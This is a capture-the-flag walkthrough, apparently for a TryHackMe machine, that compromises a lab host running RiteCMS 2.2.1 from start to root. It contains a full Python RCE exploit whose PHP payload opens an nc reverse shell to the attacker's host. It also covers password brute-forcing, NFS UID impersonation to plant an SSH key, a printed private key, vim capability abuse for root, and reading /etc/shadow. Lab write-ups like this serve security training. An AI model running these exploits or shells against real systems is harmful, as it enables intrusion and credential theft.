
# PORT SCAN
---

| PORT      | SERVICE  |
| --------- | -------- |
| 22/tcp    | ssh      |
| 80/tcp    | http     |
| 111/tcp   | rpcbind  |
| 2049/tcp  | nfs      |
| 33112/tcp | nlockmgr |

# RECONNAISSANCE
---

Let's add `undiscovered.thm` to `/etc/hosts`:

```
echo 'IP undiscovered.thm' | sudo tee -a /etc/hosts
```

We got `NFS` running on port 2049, we could try enumerating the shares:

```
showmount -e 10.201.96.204
clnt_create: RPC: Program not registered
```

We can't see the shares, but if we mount the entire NFS export, we can see this:

```
sudo mkdir /mnt/nfs
mount -t nfs 10.201.96.204:/ /mnt/nfs

cd nfs; ls
home

cd home
❯ ls -la
drwxr-xr-x root   root    4.0 KB Fri Sep  4 10:56:09 2020  .
drwxr-xr-x root   root    4.0 KB Fri Sep  4 09:38:35 2020  ..
drwxr-x--- nobody nogroup 4.0 KB Wed Sep  9 12:36:34 2020  william
```

We can't access `William`'s home since its owned by `nobody:nogroup`, let's leave it like that for now and go to the web application:

![Pasted image 20250926012705.png](../../IMAGES/Pasted%20image%2020250926012705.png)

Time to fuzz then:



If we fuzz for vhosts, we find the following ones:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.201.96.204 -H "Host: FUZZ.undiscovered.thm" -mc 200,301,302 -t 100 -ic -c -fw 18

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.201.96.204
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.undiscovered.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,301,302
 :: Filter           : Response words: 18
________________________________________________

manager                 [Status: 200, Size: 4584, Words: 385, Lines: 69, Duration: 243ms]
dashboard               [Status: 200, Size: 4626, Words: 385, Lines: 69, Duration: 244ms]
deliver                 [Status: 200, Size: 4650, Words: 385, Lines: 83, Duration: 255ms]
newsite                 [Status: 200, Size: 4584, Words: 385, Lines: 69, Duration: 251ms]
develop                 [Status: 200, Size: 4584, Words: 385, Lines: 69, Duration: 243ms]
network                 [Status: 200, Size: 4584, Words: 385, Lines: 69, Duration: 244ms]
maintenance             [Status: 200, Size: 4668, Words: 385, Lines: 69, Duration: 244ms]
forms                   [Status: 200, Size: 4542, Words: 385, Lines: 69, Duration: 245ms]
mailgate                [Status: 200, Size: 4605, Words: 385, Lines: 69, Duration: 245ms]
terminal                [Status: 200, Size: 4605, Words: 385, Lines: 69, Duration: 244ms]
play                    [Status: 200, Size: 4521, Words: 385, Lines: 69, Duration: 245ms]
view                    [Status: 200, Size: 4521, Words: 385, Lines: 69, Duration: 249ms]
gold                    [Status: 200, Size: 4521, Words: 385, Lines: 69, Duration: 249ms]
internet                [Status: 200, Size: 4605, Words: 385, Lines: 69, Duration: 249ms]
start                   [Status: 200, Size: 4542, Words: 385, Lines: 69, Duration: 250ms]
booking                 [Status: 200, Size: 4599, Words: 385, Lines: 84, Duration: 251ms]
resources               [Status: 200, Size: 4626, Words: 385, Lines: 69, Duration: 243ms]
```

But all of them are basically the same one:

![Pasted image 20250926012712.png](../../IMAGES/Pasted%20image%2020250926012712.png)

If we search for an exploit regarding `RiteCMS 2.2.1`, we can see this:

![Pasted image 20250926012717.png](../../IMAGES/Pasted%20image%2020250926012717.png)

There's an authenticated RCE on this version, we can go to this url that explains the vuln:

- [Rite CMS 2.2.1 RCE](https://www.exploit-db.com/exploits/48636)

![Pasted image 20250926012721.png](../../IMAGES/Pasted%20image%2020250926012721.png)

We need to find any subdomain that's different from the ones we have, if we filter the lines from the ones we found, we notice there's two that are different from `69`:

```
deliver                 [Status: 200, Size: 4650, Words: 385, Lines: 83, Duration: 255ms]

booking                 [Status: 200, Size: 4599, Words: 385, Lines: 84, Duration: 251ms]
```

Checking the `deliver` subdomain, we find the `/cms/index.php` panel:

![Pasted image 20250926012724.png](../../IMAGES/Pasted%20image%2020250926012724.png)

Let's begin exploitation.


# EXPLOITATION
---

Trying the `admin:admin` set of credentials here don't work, let's try to brute force the `admin` user then, I will use Caido:

![Pasted image 20250926012729.png](../../IMAGES/Pasted%20image%2020250926012729.png)

After the `liverpool` password, all requests authenticate us, which mean this is the real password, we got our credentials:

```
admin / liverpool
```

The vuln relied on the File Manager section:

![Pasted image 20250926012733.png](../../IMAGES/Pasted%20image%2020250926012733.png)

We can find an exploit which automates the process:

- [Python Exploit](https://www.exploit-db.com/exploits/48915)

You need to modify the script a bit or else it won't work, use this one:

```python
#!/usr/bin/env python3
# coding=utf-8
# Exploit Title: RiteCMS 2.2.1 - Authenticated Remote Code Execution (fixed for python3)
# Note: modernized prints, inputs, and fixed indentation + ascii literal

import requests
import sys
import base64
import os
from colorama import Fore, Back, Style
from requests_toolbelt.multipart.encoder import MultipartEncoder

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

# Variable
CONTENT = '<form action="index.php" method="post">'

# Header
def header():
    top = cyan('''
 _____  _ _        _____ __  __  _____ 
|  __ \(_) |      / ____|  \/  |/ ____|
| |__) |_| |_ ___| |    | \  / | (___              
|  _  /| | __/ _ \ |    | |\/| |\___ \     _  __  |_  |  |_  | <  /
| | \ \| | ||  __/ |____| |  | |____) |   | |/ / / __/_ / __/_ / / 
|_|  \_\_|\__\___|\_____|_|  |_|_____/    |___/ /____(_)____(_)_/                                      
''')
    return top


def info():
    top = cyan('''
[+] IP : {0}
[+] USERNAME : {1}
[+] PASSWORD : {2}
'''.format(IP, USER, PASS))
    return top


# Color Function
def cyan(STRING):
    return Style.BRIGHT + Fore.CYAN + STRING + Fore.RESET


def red(STRING):
    return Style.BRIGHT + Fore.RED + STRING + Fore.RESET


# Main
if __name__ == "__main__":
    # show header
    print(header())
    print("\t--------------------------------------------------------------")
    print("\t|  RiteCMS v2.2.1 - Authenticated Remote Code Execution      |")
    print("\t--------------------------------------------------------------")
    print("\t| Reference : https://www.exploit-db.com/exploits/48636      |")
    print("\t| By        : H0j3n                                          |")
    print("\t--------------------------------------------------------------")

    if len(sys.argv) == 1:
        print(red("[+] Usage :\t\t python %s http://10.10.10.10 admin:admin" % sys.argv[0]))
        print(cyan("\n[-] Please Put IP & Credentials"))
        sys.exit(-1)
    if len(sys.argv) == 2:
        print(red("[+] Usage :\t\t python %s http://10.10.10.10 admin:admin" % sys.argv[0]))
        print(cyan("\n[-] Please Put Credentials"))
        sys.exit(-1)
    if len(sys.argv) > 3:
        print(red("[+] Usage :\t\t python %s http://10.10.10.10 admin:admin" % sys.argv[0]))
        print(cyan("\n[-] Only 2 arguments needed please see the usage!"))
        sys.exit(-1)

    IP = sys.argv[1]
    USER, PASS = sys.argv[2].split(":")
    print(info())

    URL = '{0}/cms/index.php'.format(IP)
    URL_UPLOAD = URL + '?mode=filemanager&action=upload&directory=media'

    HEAD = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
    }
    LOG_INFO = {"username": USER, "userpw": PASS}

    try:
        with requests.Session() as SESSION:
            SESSION.get(URL, verify=False)
            SESSION.post(URL, data=LOG_INFO, headers=HEAD, allow_redirects=False)
    except Exception:
        print(red("[-] Check the URL!"))
        sys.exit(-1)

    try:
        r_upload_page = SESSION.get(URL_UPLOAD, verify=False)
    except Exception:
        print(red("[-] Could not reach upload page"))
        sys.exit(-1)

    if CONTENT in str(r_upload_page.text):
        print(red("[-] Cannot Login!"))
        sys.exit(-1)
    else:
        print(cyan("[+] Credentials Working!"))

    LHOST = input("Enter LHOST : ")
    LPORT = input("Enter LPORT : ")
    FILENAME = input("Enter FileName (include.php) : ")

    PAYLOAD = "<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f'); ?>".format(
        LHOST, LPORT
    )
    FORM_DATA = {
        'mode': (None, 'filemanager'),
        'file': (FILENAME, PAYLOAD),
        'directory': (None, 'media'),
        'file_name': (None, ''),
        'upload_mode': (None, '1'),
        'resize_xy': (None, 'x'),
        'resize': (None, '640'),
        'compression': (None, '80'),
        'thumbnail_resize_xy': (None, 'x'),
        'thumbnail_resize': (None, '150'),
        'thumbnail_compression': (None, '70'),
        'upload_file_submit': (None, 'OK - Upload file')
    }
    HEADER_UPLOAD = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Referer': URL_UPLOAD
    }

    try:
        response = SESSION.post(URL, files=FORM_DATA, headers=HEADER_UPLOAD, verify=False)
    except Exception:
        print(red("[-] Upload request failed"))
        sys.exit(-1)

    if FILENAME in response.text:
        print(cyan("\n[+] File uploaded and can be found!"))
    else:
        print(red("[-] File cannot be found or use different file name!"))
        sys.exit(-1)

    URL_GET = IP.rstrip('/') + '/media/{0}'.format(FILENAME)
    OPTIONS = input("Exploit Now (y/n)? ")
    print(cyan("\nW0rk1ng!!! Enjoy :)"))

    try:
        SESSION.get(URL_GET, verify=False)
    except Exception:
        print(red("[-] Could not retrieve uploaded file"))
```

Here's the usage:

```python
python3 RCE.py -h
 _____  _ _        _____ __  __  _____ 
|  __ \(_) |      / ____|  \/  |/ ____|
| |__) |_| |_ ___| |    | \  / | (___              
|  _  /| | __/ _ \ |    | |\/| |\___ \     _  __  |_  |  |_  | <  /
| | \ \| | ||  __/ |____| |  | |____) |   | |/ / / __/_ / __/_ / / 
|_|  \_\_|\__\___|\_____|_|  |_|_____/    |___/ /____(_)____(_)_/                                      

	--------------------------------------------------------------
	|  RiteCMS v2.2.1 - Authenticated Remote Code Execution      |
	--------------------------------------------------------------
	| Reference : https://www.exploit-db.com/exploits/48636      |
	| By        : H0j3n                                          |
	--------------------------------------------------------------
[+] Usage :		python RCE.py http://10.10.10.10 admin:admin

[-] Please Put Credentials
```

Let's use it then:

```
python3 RCE.py http://deliver.undiscovered.thm admin:liverpool
```

We get this, make sure to enter the required options, you don't need a `include.php` file, just to put that as the answer:

![Pasted image 20250926012746.png](../../IMAGES/Pasted%20image%2020250926012746.png)

If you had a listener ready, you should be able to see the reverse shell:

![Pasted image 20250926012750.png](../../IMAGES/Pasted%20image%2020250926012750.png)

Let's begin privilege escalation then.

# PRIVILEGE ESCALATION
---

Time to use `linpeas`, if you're using penelope, you can do the following to upload linpeas:

```
cd /tmp

F12

run upload_privesc_scripts

interact 1
```

We can find this:

![Pasted image 20250926012754.png](../../IMAGES/Pasted%20image%2020250926012754.png)

But we can't even access that binary:

```
www-data@undiscovered:/tmp$ /usr/bin/vim.basic -c ':!whoami' -c ':q!'
bash: /usr/bin/vim.basic: Permission denied
```

Seems that will be our way in once we get a shell as another user.

Taking another look at the linpeas scan and as we knew earlier, we can mount the NFS share for the home directory of William:

```
/home/william	*(rw,root_squash)
```

But we know that if we mount the share on our machine, we can't access it, well, NFS uses numeric UIDs instead of usernames for permission checking. When you create a local user with the same UID as a user on the NFS server, the server treats you as that user because it only verifies the UID number, not the actual username. This allow us to impersonate users and access their files on the shared directory by matching UIDs between systems.

Let's check the UIDs for our users:

```
www-data@undiscovered:/tmp$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:111:118:MySQL Server,,,:/nonexistent:/bin/false
statd:x:112:65534::/var/lib/nfs:/bin/false
william:x:3003:3003::/home/william:/bin/bash
leonard:x:1002:1002::/home/leonard:/bin/bash
nfsnobody:x:3004:3005::/home/nfsnobody:
```

Let's create the user on our local machine:

```
sudo useradd -u 3003 -d /dev/shm william
```

Now we need to mount the share:

```
# As our local user, not william

mkdir mnt
sudo mount -t nfs 10.201.96.204:/home/william ./mnt/ 

# As william

sudo su william
cd mnt/
```

If we check the files here, we find this:

```
william@fsociety:/home/kali/thm/undiscovered/mnt$ ls -la
total 44
drwxr-x--- 4 william william 4096 Sep  9  2020 .
drwxrwxr-x 4 kali    kali    4096 Sep 25 20:00 ..
-rwxr-xr-x 1 root    root     128 Sep  4  2020 admin.sh
-rw------- 1 root    root       0 Sep  9  2020 .bash_history
-rw-r--r-- 1 william william 3771 Sep  4  2020 .bashrc
drwx------ 2 william william 4096 Sep  4  2020 .cache
drwxrwxr-x 2 william william 4096 Sep  4  2020 .nano
-rw-r--r-- 1 william william   43 Sep  4  2020 .profile
-rwsrwsr-x 1 nobody  nogroup 8776 Sep  4  2020 script
-rw-r----- 1 root    william   38 Sep  9  2020 user.txt
```

We got our user flag:

```bash
william@fsociety:/home/kali/thm/undiscovered/mnt$ cat user.txt
THM{8d7b7299cccd1796a61915901d0e091c}
```

Let's check the `admin.sh` file:

```bash
william@fsociety:/home/kali/thm/undiscovered/mnt$ cat admin.sh 
#!/bin/sh

    echo "[i] Start Admin Area!"
    echo "[i] Make sure to keep this script safe from anyone else!"
    
    exit 0
```

Ok, remember we got read, write permissions on the share, we can embed anything on here, what if we create a public key and add it to `.ssh/authorized_keys`, let's do it:

```
ssh-keygen -f key
```

Now we need to simply need to create the `.ssh` directory and add the public key to authorized keys:

```
william@fsociety:/home/kali/thm/undiscovered/mnt$ mkdir .ssh
william@fsociety:/home/kali/thm/undiscovered/mnt$ cat ../key.pub > .ssh/authorized_keys
```

If it worked, we should be able to access ssh as william now using the private key ssh generated:

```
chmod 600 key
ssh william@undiscovered.thm -i key
```

![Pasted image 20250926012804.png](../../IMAGES/Pasted%20image%2020250926012804.png)

It worked, once we got access to the shell, we notice that there's a script with a suid set for leonard, this appeared as `nobody` on the share:

```
william@undiscovered:~$ ls -la
total 48
drwxr-x--- 5 william william 4096 Sep 26 08:06 .
drwxr-xr-x 4 root    root    4096 Sep  4  2020 ..
-rwxr-xr-x 1 root    root     128 Sep  4  2020 admin.sh
-rw------- 1 root    root       0 Sep  9  2020 .bash_history
-rw-r--r-- 1 william william 3771 Sep  4  2020 .bashrc
drwx------ 2 william william 4096 Sep  4  2020 .cache
drwxrwxr-x 2 william william 4096 Sep  4  2020 .nano
-rw-r--r-- 1 william william   43 Sep  4  2020 .profile
-rwsrwsr-x 1 leonard leonard 8776 Sep  4  2020 script
drwxrwxr-x 2 william william 4096 Sep 26 08:07 .ssh
-rw-r----- 1 root    william   38 Sep 10  2020 user.txt
```

![Pasted image 20250926012809.png](../../IMAGES/Pasted%20image%2020250926012809.png)

Let's run it:

```
william@undiscovered:~$ ./script 
[i] Start Admin Area!
[i] Make sure to keep this script safe from anyone else!
```

This seems to be the same as the `admin.sh` file we found earlier, if we check the scripts for the script, we find this:

```
william@undiscovered:~$ strings script 
/lib64/ld-linux-x86-64.so.2
n2JP
libc.so.6
setreuid
__stack_chk_fail
strcat
system
__libc_start_main
__gmon_start__
GLIBC_2.2.5
GLIBC_2.4
UH-P
/bin/catH
 /home/lH
eonard/
dH34%(
AWAVA
AUATL
[]A\A]A^A_
./admin.sh
;*3$"
GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609
crtstuff.c
__JCR_LIST__
deregister_tm_clones
__do_global_dtors_aux
completed.7594
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
script.c
__FRAME_END__
__JCR_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
__stack_chk_fail@@GLIBC_2.4
system@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
setreuid@@GLIBC_2.2.5
__bss_start
main
_Jv_RegisterClasses
strcat@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.jcr
.dynamic
.got.plt
.data
.bss
.comment
```

Notice that `/bin/cat` section, what if we try running `./script admin.sh`;

```
william@undiscovered:~$ ./script admin.sh
/bin/cat: /home/leonard/admin.sh: No such file or directory
```

The script is using `/bin/cat` to show us the files inside of `/home/leonard`, we can't perform path traversal so, what if we simply read the `id_rsa` for this user:

```
william@undiscovered:~$ ./script /.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAwErxDUHfYLbJ6rU+r4oXKdIYzPacNjjZlKwQqK1I4JE93rJQ
HEhQlurt1Zd22HX2zBDqkKfvxSxLthhhArNLkm0k+VRdcdnXwCiQqUmAmzpse9df
YU/UhUfTu399lM05s2jYD50A1IUelC1QhBOwnwhYQRvQpVmSxkXBOVwFLaC1AiMn
SqoMTrpQPxXlv15Tl86oSu0qWtDqqxkTlQs+xbqzySe3y8yEjW6BWtR1QTH5s+ih
hT70DzwhCSPXKJqtPbTNf/7opXtcMIu5o3JW8Zd/KGX/1Vyqt5ememrwvaOwaJrL
+ijSn8sXG8ej8q5FidU2qzS3mqasEIpWTZPJ0QIDAQABAoIBAHqBRADGLqFW0lyN
C1qaBxfFmbc6hVql7TgiRpqvivZGkbwGrbLW/0Cmes7QqA5PWOO5AzcVRlO/XJyt
+1/VChhHIH8XmFCoECODtGWlRiGenu5mz4UXbrVahTG2jzL1bAU4ji2kQJskE88i
72C1iphGoLMaHVq6Lh/S4L7COSpPVU5LnB7CJ56RmZMAKRORxuFw3W9B8SyV6UGg
Jb1l9ksAmGvdBJGzWgeFFj82iIKZkrx5Ml4ZDBaS39pQ1tWfx1wZYwWw4rXdq+xJ
xnBOG2SKDDQYn6K6egW2+aNWDRGPq9P17vt4rqBn1ffCLtrIN47q3fM72H0CRUJI
Ktn7E2ECgYEA3fiVs9JEivsHmFdn7sO4eBHe86M7XTKgSmdLNBAaap03SKCdYXWD
BUOyFFQnMhCe2BgmcQU0zXnpiMKZUxF+yuSnojIAODKop17oSCMFWGXHrVp+UObm
L99h5SIB2+a8SX/5VIV2uJ0GQvquLpplSLd70eVBsM06bm1GXlS+oh8CgYEA3cWc
TIJENYmyRqpz3N1dlu3tW6zAK7zFzhTzjHDnrrncIb/6atk0xkwMAE0vAWeZCKc2
ZlBjwSWjfY9Hv/FMdrR6m8kXHU0yvP+dJeaF8Fqg+IRx/F0DFN2AXdrKl+hWUtMJ
iTQx6sR7mspgGeHhYFpBkuSxkamACy9SzL6Sdg8CgYATprBKLTFYRIUVnZdb8gPg
zWQ5mZfl1leOfrqPr2VHTwfX7DBCso6Y5rdbSV/29LW7V9f/ZYCZOFPOgbvlOMVK
3RdiKp8OWp3Hw4U47bDJdKlK1ZodO3PhhRs7l9kmSLUepK/EJdSu32fwghTtl0mk
OGpD2NIJ/wFPSWlTbJk77QKBgEVQFNiowi7FeY2yioHWQgEBHfVQGcPRvTT6wV/8
jbzDZDS8LsUkW+U6MWoKtY1H1sGomU0DBRqB7AY7ON6ZyR80qzlzcSD8VsZRUcld
sjD78mGZ65JHc8YasJsk3br6p7g9MzbJtGw+uq8XX0/XlDwsGWCSz5jKFDXqtYM+
cMIrAoGARZ6px+cZbZR8EA21dhdn9jwds5YqWIyri29wQLWnKumLuoV7HfRYPxIa
bFHPJS+V3mwL8VT0yI+XWXyFHhkyhYifT7ZOMb36Zht8yLco9Af/xWnlZSKeJ5Rs
LsoGYJon+AJcw9rQaivUe+1DhaMytKnWEv/rkLWRIaiS+c9R538=
-----END RSA PRIVATE KEY-----
```

Nice, we got the key, let's save it to a file and log in as leonard:

```
nano leonard
chmod 600 leonard
ssh leonard@undiscovered.thm -i leonard
```

![Pasted image 20250926012818.png](../../IMAGES/Pasted%20image%2020250926012818.png)

Remember the `/usr/bin/vim.basic` file we found earlier, let's check if we can use it now abusing the `cap_setuid+ep` capability it got:

```
/usr/bin/vim.basic -c ':!whoami' -c ':q!'

leonard
```

Let's check if `vim.basic` has python support:

```
/usr/bin/vim.basic --version | grep python

+cryptv          +linebreak       -python          +vreplace
+cscope          +lispindent      +python3         +wildignore
Linking: gcc   -Wl,-Bsymbolic-functions -fPIE -pie -Wl,-z,relro -Wl,-z,now -Wl,--as-needed -o vim        -lm -ltinfo -lnsl  -lselinux  -lacl -lattr -lgpm -ldl     -L/usr/lib/python3.5/config-3.5m-x86_64-linux-gnu -lpython3.5m -lpthread -ldl -lutil -lm 
```

It does have support, let's use the python method to get a shell as root:

![Pasted image 20250926012822.png](../../IMAGES/Pasted%20image%2020250926012822.png)

```
/usr/bin/vim.basic -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

![Pasted image 20250926012850.png](../../IMAGES/Pasted%20image%2020250926012850.png)

We need to change `py` to `py3` since we know it has python3 support and change the shell type to bash:

```
/usr/bin/vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/bash", "sh", "-c", "reset; exec bash")'
```

Once you run that command:

![Pasted image 20250926012854.png](../../IMAGES/Pasted%20image%2020250926012854.png)

We got root access, the question asks for the root password rather than a flag, still, the root flag exists too:

```
root@undiscovered:/root# cat root.txt 
  _    _           _ _                                     _ 
 | |  | |         | (_)                                   | |
 | |  | |_ __   __| |_ ___  ___ _____   _____ _ __ ___  __| |
 | |  | | '_ \ / _` | / __|/ __/ _ \ \ / / _ \ '__/ _ \/ _` |
 | |__| | | | | (_| | \__ \ (_| (_) \ V /  __/ | |  __/ (_| |
  \____/|_| |_|\__,_|_|___/\___\___/ \_/ \___|_|  \___|\__,_|
      
             THM{8d7b7299cccd1796a61915901d0e091c}
```

Let's read the password:

```
root@undiscovered:/root# cat /etc/shadow
root:$6$1VMGCoHv$L3nX729XRbQB7u3rndC.8wljXP4eVYM/SbdOzT1IET54w2QVsVxHSH.ghRVRxz5Na5UyjhCfY6iv/koGQQPUB0:18508:0:99999:7:::
```

Our hash is:

```
$6$1VMGCoHv$L3nX729XRbQB7u3rndC.8wljXP4eVYM/SbdOzT1IET54w2QVsVxHSH.ghRVRxz5Na5UyjhCfY6iv/koGQQPUB0
```

![Pasted image 20250926012858.png](../../IMAGES/Pasted%20image%2020250926012858.png)

